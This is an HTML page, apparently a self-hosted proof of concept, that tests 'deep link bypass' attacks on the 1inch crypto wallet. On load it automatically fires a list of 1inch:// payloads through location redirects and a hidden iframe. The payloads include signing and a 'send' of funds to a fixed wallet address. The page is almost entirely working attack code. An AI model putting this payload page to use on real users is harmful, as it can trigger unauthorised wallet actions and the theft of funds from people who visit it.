<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>1inch Deep Link Bypass Test</title>
    <style>
        body { font-family: Arial; background: #000; color: #0f0; padding: 20px; }
        button { padding: 18px; margin: 12px 0; width: 100%; font-size: 17px; background: #c00; color: white; border: none; border-radius: 10px; }
        pre { background: #111; padding: 15px; border-radius: 8px; }
    </style>
</head>
<body>
    <h1>🛠️ Deep Link Bypass Test - 1inch Wallet</h1>
    <p>Host: <strong>https://0x403for.github.io</strong></p>

    <button onclick="testAllSchemes()">🔥 Test Semua Deep Link Variants</button>
    <button onclick="testDirectScheme()">Direct 1inch:// Scheme</button>
    <button onclick="testLocationReplace()">location.replace + Scheme</button>
    <button onclick="testIframeScheme()">Iframe Scheme Test</button>

    <h2>Log</h2>
    <pre id="log"></pre>

    <script>
        const logEl = document.getElementById('log');

        function log(msg, error = false) {
            const time = new Date().toLocaleTimeString();
            logEl.innerHTML += `<span style="color:${error ? '#ff6666' : '#66ff99'}">[${time}] ${msg}</span><br>`;
            console.log(msg);
        }

        function testAllSchemes() {
            const payloads = [
                "1inch://",
                "1inch://connect",
                "1inch://sign?data=test",
                "1inch://walletconnect",
                "1inch://send?to=0xDDf9d60E588aCe13307aC1828d7DE211B4Ef949A&value=100000000000000000",
                "1inch://bypass",
                "1inch://test",
                "//1inch://bypass",
                "https://0x403for.github.io/1inch://bypass"
            ];

            payloads.forEach(p => {
                log(`Mencoba: ${p}`);
                try {
                    window.location.href = p;
                } catch(e) {}
                try {
                    window.location.replace(p);
                } catch(e) {}
            });
        }

        function testDirectScheme() {
            log("Direct scheme test...");
            window.location = "1inch://bypass";
        }

        function testLocationReplace() {
            log("location.replace test...");
            window.location.replace("1inch://test");
        }

        function testIframeScheme() {
            log("Iframe deep link test...");
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = "1inch://bypass";
            document.body.appendChild(iframe);
        }

        // Auto test on load
        setTimeout(() => {
            log("Test otomatis dijalankan...");
            testAllSchemes();
        }, 1500);
    </script>
</body>
</html>
